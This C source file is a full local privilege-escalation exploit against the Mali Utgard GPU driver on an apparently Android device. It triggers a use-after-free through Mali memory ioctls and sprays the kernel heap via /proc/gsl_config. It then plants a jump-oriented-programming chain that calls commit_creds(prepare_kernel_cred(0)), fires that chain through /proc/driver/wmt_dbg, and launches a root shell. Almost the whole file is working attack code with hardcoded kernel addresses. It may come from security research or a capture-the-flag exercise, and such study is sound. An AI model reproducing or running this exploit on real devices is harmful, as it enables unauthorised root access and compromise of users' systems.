#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <pthread.h>

#define MALLOC_COUNT 100
#define MAX_ATTEMPTS 5
#define NUM_GSL_SPRAY_THREADS 50

#define PREPARE_KERNEL_CRED_ADDR 0xc0046ccc
#define COMMIT_CREDS_ADDR        0xc0046720

/* IOCTL definitions - using the actual Mali device values */
#define MALI_IOCTL_MEM_ALLOC 0xc0208300
#define MALI_IOCTL_MEM_FREE  0xc0108301

#define PAGE_SIZE 4096
#define MEM_SIZE (PAGE_SIZE)  // 64KB allocation size
#define BUFF_SIZE 80              // Target kmalloc-128

/* Memory mapping structures - matching the device code */
typedef struct {
    unsigned long long ctx;      // User-kernel context
    unsigned int gpu_vaddr;      // GPU virtual address
    unsigned int vsize;          // Virtual size
    unsigned int psize;          // Physical size
    unsigned int flags;          // Flags
    unsigned long backend_handle; // Backend handle
} mali_mem_alloc;

typedef struct {
    unsigned long long ctx;      // User-kernel context
    unsigned int gpu_vaddr;      // GPU virtual address to free
    unsigned int free_pages_nr;  // Number of free pages
} mali_mem_free;

// spoofed structures for spray
struct allocation_manager {
    uint32_t vm_lock;           // offset 0x0 - set to 0x0
    uint8_t padding[0xc];       // padding to fill space
};

struct kernel_mutex {
    volatile int32_t lock_count;  // Must be at offset 0x0
    int32_t padding[3];           // Padding to get owner at offset 0x10
    void* owner;                  
};

// Structure for session
struct session {
    uint8_t padding[0xd8];               // padding to reach offset 0xe0
    struct allocation_manager alloc_mgr; // offset 0xd8 - allocation manager
    struct kernel_mutex mutex_lock;
};

// Structure for mali vma node
struct mali_vma_node {
    uint8_t padding[0x8];  
    uint32_t target_field;      // offset 0x8 - this needs to be 0
};

volatile int start = 0;
volatile int write_flag = 0;    // NEW: Flag to trigger writes
int fd1 = -1;
int fd2 = -1;
unsigned char target_match[0x100]; // Global buffer to store the target match
int target_match_found = 0;

// Global spray buffer
uint32_t g_spray_buff[BUFF_SIZE / 4];

// Mutex and condition variable for thread synchronization
pthread_mutex_t write_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t write_cond = PTHREAD_COND_INITIALIZER;

static struct allocation_manager g_alloc_mgr;
static struct session g_session;
static struct mali_vma_node g_vma_node;

// Structure to pass data to the thread
typedef struct {
    void *buffer;
    size_t length;
} write_thread_data_t;

/**
 * Thread function that performs the actual write operation
 * Modified to wait for write_flag before proceeding
 */
void *write_thread_func(void *arg) {
    write_thread_data_t *data = (write_thread_data_t *)arg;
    int fd;
    ssize_t total_written = 0;
    
    // Open the device file
    fd = open("/proc/gsl_config", O_WRONLY);
    if (fd < 0) {
        perror("Failed to open /proc/gsl_config");
        free(data->buffer);
        free(data);
        return NULL;
    }

    // Wait for the write flag to be set by main thread
    pthread_mutex_lock(&write_mutex);
    while (!write_flag) {
        pthread_cond_wait(&write_cond, &write_mutex);
    }
    pthread_mutex_unlock(&write_mutex);

    fflush(stdout);
    total_written = write(fd, (const char *)data->buffer, data->length);
    
    if (total_written < 0) {
        perror("Failed to write to /proc/gsl_config");
        close(fd);
        free(data->buffer);
        free(data);
        return NULL;
    }

    close(fd);
    
    // Clean up
    free(data->buffer);
    free(data);
    
    return NULL;
}

void important_ascii_art() {
    printf("\n\033[38;5;225m");
    printf("███████ ██████  ███████ ██      ███████ \n");
    printf("\033[38;5;183m");
    printf("██      ██   ██ ██      ██      ██      \n");
    printf("\033[38;5;141m");
    printf("█████   ██████  █████   ██      ███████ \n");
    printf("\033[38;5;99m");
    printf("██      ██   ██ ██      ██           ██ \n");
    printf("\033[38;5;57m");
    printf("██      ██   ██ ███████ ███████ ███████ \n");
    printf("\n\033[0m");
}

/**
 * Writes a buffer to /proc/gsl_config in a background thread
 * Thread will block until write_flag is set
 * 
 * @param buffer Pointer to the data buffer to write
 * @param length Number of bytes to write from the buffer
 * @return 0 on success (thread created), -1 on error
 */
int write_to_gsl_config_async(const void *buffer, size_t length) {
    pthread_t thread;
    write_thread_data_t *data;
    
    // Allocate memory for thread data
    data = (write_thread_data_t *)malloc(sizeof(write_thread_data_t));
    if (!data) {
        perror("Failed to allocate thread data");
        return -1;
    }
    
    // Allocate and copy the buffer (so caller can free their copy)
    data->buffer = malloc(length);
    if (!data->buffer) {
        perror("Failed to allocate buffer copy");
        free(data);
        return -1;
    }
    
    memcpy(data->buffer, buffer, length);
    data->length = length;
    
    // Create detached thread so it cleans up automatically
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    
    if (pthread_create(&thread, &attr, write_thread_func, data) != 0) {
        perror("Failed to create thread");
        free(data->buffer);
        free(data);
        pthread_attr_destroy(&attr);
        return -1;
    }
    
    pthread_attr_destroy(&attr);
    
    return 0;
}

int write_gsl_config(int fd, uint32_t value, uint32_t offset)
{
    char buf[64];
    int ret;
    
    // Format the command string: "id=0xOFFSET,VALUE"
    snprintf(buf, sizeof(buf), "id=0x%08x,%08x", offset, value);

    printf("[*] Writing %s to /proc/gsl_config\n", buf);
    
    // Write to the proc file
    ret = write(fd, buf, strlen(buf));
    if (ret < 0) {
        perror("Failed to write to /proc/gsl_config");
        return -1;
    }
    
    return 0;
}

int write_wmt_dbg_cmd(int fd, const char *command) {
    ssize_t bytes_written;
    
    printf("[*] Writing command: %s\n", command);
    bytes_written = write(fd, command, strlen(command));
    
    if (bytes_written < 0) {
        printf("[+] Failed to write to /proc/driver/wmt_dbg... this is good!!!!\n");
        return -1;
    }
    
    printf("Successfully wrote %zd bytes\n", bytes_written);
    return 0;
}

int main() {
    important_ascii_art();

    int fd, i;
    void* mapped_region;

    // Open the mali device
    fd = open("/dev/mali", O_RDWR);
    if (fd < 0) {
        perror("[-] Failed to open Mali device");
        return -1;
    }
    printf("[+] Opened Mali device: %d\n", fd);
    

    // init spray data

    // Initialize our structures
    memset(&g_alloc_mgr, 0, sizeof(g_alloc_mgr));
    memset(&g_session, 0, sizeof(g_session));
    memset(&g_vma_node, 0, sizeof(g_vma_node));
    
    // Set up the fake structures
    g_alloc_mgr.vm_lock = 0x0; // vm_lock at offset 0x0 = 0x0
    g_session.alloc_mgr = g_alloc_mgr;
    g_session.mutex_lock.lock_count = 1; // Initialize to unlocked state (1 = unlocked)
    g_session.mutex_lock.owner = 0x0;
    g_vma_node.target_field = 0x0; // mali vma node has 0 at offset 0x8

    // Prepare fake mali_alloc structure spray

    for (size_t i = 0; i < BUFF_SIZE / 4; i++) {
        g_spray_buff[i] = 0x0;
    }

    // need this to hit the 20ms sleep in the driver
    ((char*)g_spray_buff)[0] = 'e';
    ((char*)g_spray_buff)[1] = 'n';

    // set refcount to 1 to cause the free to be called in our UAF object
    g_spray_buff[0x4c / 4] = 0x00000001; 

    // Set offset 0x3c to 0x00000000 (mali_alloc->mali_vma_node).field13_0x1c)
    g_spray_buff[0x3c / 4] = 0x00000000;

    // Set offset 0xc (index 3) to contain pointer to session (requirement 2)
    g_spray_buff[0xc / 4] = (uintptr_t)&g_session;

    // Set offset 0x20 (index 8) to contain pointer to mali vma node (requirement 3)
    g_spray_buff[0x28 / 4] = 0x00000000; // set refcount to 1

    // overwrite list pointers
    g_spray_buff[0x40 / 4] = 0xc099762c - 0x4; // where to write it (wmt_dbg function pointer)
    g_spray_buff[0x44 / 4] = 0xc07d8c08 - 0x4; // what to write (address of first gadget - 0x4)

    
    // Give the spray thread a moment to start
    usleep(100000);

    // should work first shot, but worth a few throws in case UAF misses
    for (int i = 0; i < MAX_ATTEMPTS; i++){
        // Reset write flag
        pthread_mutex_lock(&write_mutex);
        write_flag = 0;
        pthread_mutex_unlock(&write_mutex);

        // Allocate the mali_alloc we will be attacking
        mali_mem_alloc alloc_params;
        memset(&alloc_params, 0, sizeof(alloc_params));
        alloc_params.vsize = MEM_SIZE;
        alloc_params.psize = MEM_SIZE;
        alloc_params.flags = 0;

        printf("\n[1] Allocate and map mali GPU memory\n");
        
        if (ioctl(fd, MALI_IOCTL_MEM_ALLOC, &alloc_params) < 0) {
            printf("[-] Failed to allocate memory\n");
        }
        printf("[+] Allocated mali memory: GPU VA=0x%08x\n", 
            alloc_params.gpu_vaddr);
        
        // map the allocated mali_alloc object
        printf("[*] Mapping mali memory...\n");
        mapped_region = mmap(0x0, MEM_SIZE, PROT_READ | PROT_WRITE, 
                                    MAP_SHARED, fd, alloc_params.gpu_vaddr);
        
        if (mapped_region == MAP_FAILED) {
            printf("[-] mmap failed: %s\n", strerror(errno));
        } else {
            printf("[+] Mapped region %p\n", mapped_region);
        }

        // decrement the refcount
        printf("\n[2] Decrement refcount of mali_alloc object to 1 by calling MALI_IOCTL_MEM_FREE\n");
        mali_mem_free free_params;
        memset(&free_params, 0, sizeof(free_params));
        free_params.ctx = alloc_params.ctx;  // Important: use the context from allocation
        free_params.gpu_vaddr = alloc_params.gpu_vaddr;

        if (ioctl(fd, MALI_IOCTL_MEM_FREE, &free_params) < 0) {
            perror("[-] Free failed");
        } else {
            printf("[+] Memory freed (%d): %u pages\n", i, free_params.free_pages_nr);
        }

        printf("\n[3] Initialise gsl_config write spray threads\n");

        // Initialize threads - they will block waiting for write_flag
        printf("[+] Initializing %d spray threads (they will wait for signal)...\n", NUM_GSL_SPRAY_THREADS);
        for (int j = 0; j < NUM_GSL_SPRAY_THREADS; j++){
            write_to_gsl_config_async(g_spray_buff, sizeof(g_spray_buff));
        }

        // Give threads time to initialize and reach the wait point
        usleep(50000); 

        // now trigger the free of the object
        printf("\n[4] Cause first free of underlying mali_alloc with MALI_IOCTL_MEM_FREE\n");
        ioctl(fd, MALI_IOCTL_MEM_FREE, &free_params);

        // Signal all waiting threads to proceed with writes
        printf("\n[5] Tell gsl_config spray threads to do their writes, one should get freed mali_alloc memory\n");
        pthread_mutex_lock(&write_mutex);
        write_flag = 1;
        pthread_cond_broadcast(&write_cond);
        pthread_mutex_unlock(&write_mutex);

        usleep(750); // this is important, clearly the free of the mali_alloc takes a while

        // Unmap the regions we set the ref count to 1 in the UAF so this will call the second free with our controlled mali_alloc
        printf("\n[6] Unmap UAF mali_alloc to cause second free with controlled mali_alloc\n");
        if (munmap(mapped_region, MEM_SIZE) < 0) {
            perror("[-] munmap failed");
        } else {
            printf("[+] Unmapped successfully\n");
        }

        // spray mali_alloc to try and prevent the double free from occuring (we have freed the same memory twice)
        printf("\n[7] Perform %d mali_alloc allocations to prevent double free\n", MALLOC_COUNT);
        unsigned int base_gpu_addr = alloc_params.gpu_vaddr;
        mali_mem_alloc malloc_allocs[MALLOC_COUNT];  // Store allocation info for later freeing
        
        for (int j = 0; j < MALLOC_COUNT; j++) {
            memset(&malloc_allocs[j], 0, sizeof(mali_mem_alloc));
            malloc_allocs[j].vsize = MEM_SIZE;
            malloc_allocs[j].psize = MEM_SIZE;
            malloc_allocs[j].flags = 0;
            malloc_allocs[j].gpu_vaddr = base_gpu_addr + (j * 0x1000);  // Increment by 0x1000 each time
            
            if (ioctl(fd, MALI_IOCTL_MEM_ALLOC, &malloc_allocs[j]) < 0) {
                printf("[-] MALLOC %d failed at GPU VA=0x%08x\n", j, malloc_allocs[j].gpu_vaddr);
            }
        }


        // ########## JOP PLAN #################

        // use this to kick off the chain
        // [G1] c07d8c08 01 40 a0 e1     cpy        r4,r1                // we control r1 in this, so we get control of r4
        // [G1] c07d8c0c 32 ff 2f e1     blx        r2                   // we also control r2 here so maintain execution


        // use this instead for the prepare_kernel_cred call

        // [G2] c0082998 14 30 94 e5     ldr        r3,[r4,#0x14]        // r4 offset 0x14 will contain a self referencing pointer
        // [G2] c008299c 38 30 93 e5     ldr        r3,[r3,#0x38]        // next gadget address loaded from r3 offset 0x38
        // [G2] c00829a0 00 00 53 e3     cmp        r3,#0x0              // ignore
        // [G2] c00829a4 f6 ff ff 0a     beq        LAB_c0082984         // ignore
        // [G2] c00829a8 04 00 a0 e1     cpy        r0,r4                // gets the address of controlled buffer into r0
        // [G2] c00829ac 33 ff 2f e1     blx        r3                   // branch to loaded gadget

        // [G3] c07db8f4 38 30 94 e5     ldr        r3,[r4,#0x38]        // r4 offset 0x38 will contain the address of next gadget to execute
        // [G3] c07db8f8 00 00 53 e3     cmp        r3,#0x0              // ignore
        // [G3] c07db8fc 04 00 00 0a     beq        LAB_c07db914         // ignore
        // [G3] c07db900 44 60 94 e5     ldr        r6,[r4,#0x44]        // load address into r6 used in next gadget
        // [G3] c07db904 33 ff 2f e1     blx        r3                   // branch to loaded gadget

        // [G4] c0185d70 0c 30 96 e5     ldr        r3,[r6,#0xc]         // we control r6, so load next gadget from that offset 0xc
        // [G4] c0185d74 00 50 a0 e1     cpy        r5,r0                // get address of controlled buffer into r5
        // [G4] c0185d78 08 00 a0 e1     cpy        r0,r8                // ignore, r0 clobbered now
        // [G4] c0185d7c 33 ff 2f e1     blx        r3                   // branch to loaded gadget

        // [G5] c02d8e24 48 30 95 e5     ldr        r3,[r5,#0x48]        // load address of next gadget from controlled buffer
        // [G5] c02d8e28 04 a0 a0 e1     cpy        r10,r4               // copy address of controlled buffer into r10, needed later
        // [G5] c02d8e2c 30 10 1b e5     ldr        r1,[r11,#local_34]   // ignore, hopefully r11 is fine
        // [G5] c02d8e30 33 ff 2f e1     blx        r3                   // branch to loaded gadget

        // [G6] c03052c4 40 30 96 e5     ldr        r3,[r6,#0x40]        // load address of next gadget from controlled buffer
        // [G6] c03052c8 06 10 a0 e1     cpy        r1,r6                // ignore
        // [G6] c03052cc 00 00 a0 e3     mov        r0,#0x0              // clear r0 got prepare_kernel_cred
        // [G6] c03052d0 33 ff 2f e1     blx        r3                   // branch to loaded gadget

        // [G7] c03f2c08 18 30 9a e5     ldr        r3,[r10,#0x18]       // load address of prepare_kernel_cred from controlled buffer
        // [G7] c03f2c0c 00 00 53 e3     cmp        r3,#0x0              // ignore
        // [G7] c03f2c10 00 00 00 0a     beq        LAB_c03f2c18         // ignore
        // [G7] c03f2c14 33 ff 2f e1     blx        r3                   // call prepare_kernel_cred
        // [G7] c03f2c18 0c 30 9a e5     ldr        r3,[r10,#0xc]        // load address of next gadget from controlled buffer
        // [G7] c03f2c1c 01 90 a0 e3     mov        r9,#0x1              // ignore
        // [G7] c03f2c20 33 ff 2f e1     blx        r3                   // branch to loaded gadget


        // now prepared kernel cred is in r0, need to pass that into commit_creds as r0

        // [G8] c05b7b90 50 30 94 e5     ldr        r3,[r4,#0x50]        // load address of commit_creds from controlled buffer
        // [G8] c05b7b94 33 ff 2f e1     blx        r3                   // call commit_creds
        // [G8] c05b7b98 5c 30 94 e5     ldr        r3,[r4,#0x5c]        // load address to hand back execution to
        // [G8] c05b7b9c b4 00 d5 e1     ldrh       r0,[r5,#0x4]         // ignore
        // [G8] c05b7ba0 33 ff 2f e1     blx        r3                   // return

        // now we have called commit_creds(prepare_kernel_cred(NULL)), can just return from the 'function'


        int base_offset = 0x64; // 0xc0d1f030 - useful for visualising JOP chain

        printf("\n[8] Write JOP-chain into kernel memory using /proc/gsl_config...\n");

        // Open the proc file
        int gsl_fd = open("/proc/gsl_config", O_WRONLY);
        if (gsl_fd < 0) {
            perror("Failed to open /proc/gsl_config");
            return -1;
        }

        // [G2]
        write_gsl_config(gsl_fd, 0xc0d1f030 - 0x38, base_offset + 0x14 / 4);    // [G2] - ldr r3,[r4,#0x14], first entry will be r3 loaded in G2
        write_gsl_config(gsl_fd, 0xc07db8f4, base_offset);                      // [G2] - r3 to load and branch to at the end of G2

        // [G3]
        write_gsl_config(gsl_fd, 0xc0185d70, base_offset + 0x38 / 4);           // [G3] - r3 to load and branch to at the end of G3
        write_gsl_config(gsl_fd, 0xc0d1f030 + 0x14, base_offset + 0x44 / 4);    // [G3] - r6 to use in G4 to load next gadget

        // [G4]
        write_gsl_config(gsl_fd, 0xc02d8e24, base_offset + 0x20 / 4);           // [G4] - r3 to load and branch to at the end of G4

        // [G5]
        write_gsl_config(gsl_fd, 0xc03052c4, base_offset + 0x48 / 4);           // [G5] - r3 to load and branch to at the end of G5

        // [G6]
        write_gsl_config(gsl_fd, 0xc03f2c08, base_offset + 0x54 / 4);           // [G6] - r3 to load and branch to at the end of G6 (+ 0x14 from earlier r6 load adjustment)

        // [G7]
        write_gsl_config(gsl_fd, 0xc05b7b90, base_offset + 0xc / 4);            // [G7] - r3 to load and branch to at the end of G7
        write_gsl_config(gsl_fd, PREPARE_KERNEL_CRED_ADDR, base_offset + 0x18 / 4); // [G7] - address of prepare kernel cred function to call

        // [G8]
        write_gsl_config(gsl_fd, COMMIT_CREDS_ADDR, base_offset + 0x50 / 4);    // [G8] - address of commit_creds function to call
        write_gsl_config(gsl_fd, 0xc04c5770, base_offset + 0x5C / 4);           // [G8] - address to hand back execution

        close(gsl_fd);

        // trigger the JOP chain we just wrote
        printf("\n[9] Trigger JOP-chain via /proc/driver/wmt_dbg...\n");

        char command[256];
        int wmt_dbg_fd = open("/proc/driver/wmt_dbg", O_WRONLY);
        //                                  r0    r1        r2
        snprintf(command, sizeof(command), "3 -3f2e0fd0 -3ff7d668");
        write_wmt_dbg_cmd(wmt_dbg_fd, command);
        close(wmt_dbg_fd);

        // hopefully it worked!
        printf("[*] Checking if we are root...\n");
        if (getuid() == 0) {
            printf("[+] We're root! Popping shell...\n");
            break;
        } else {
            printf("[-] We're not root yet :(\n");
            sleep(1);
        }

        // Free all allocations if UAF didnt land
        printf("\n[*] Freeing %d MALLOC allocations...\n", MALLOC_COUNT);
        for (int j = 0; j < MALLOC_COUNT; j++) {
            if (malloc_allocs[j].backend_handle != 0) {  // Only free if allocation succeeded
                mali_mem_free free_malloc;
                memset(&free_malloc, 0, sizeof(free_malloc));
                free_malloc.ctx = malloc_allocs[j].ctx;
                free_malloc.gpu_vaddr = malloc_allocs[j].gpu_vaddr;
                
                if (ioctl(fd, MALI_IOCTL_MEM_FREE, &free_malloc) < 0) {
                    printf("[-] FREE %d failed at GPU VA=0x%08x\n", j, malloc_allocs[j].gpu_vaddr);
                }
            }
        }

        usleep(250000);

        printf("Trying again!\n");
    }

    // if we are root, pop a shell!
    if (getuid() == 0) {
        char* shell = "/system/bin/sh";
        char* args[] = {shell, "-i", NULL};
        execve(shell, args, NULL);
    } else {
        printf("[-] Utgard won the battle but not the war... try again\n");
    }

    // Clean up
    close(fd);

    return 0;
}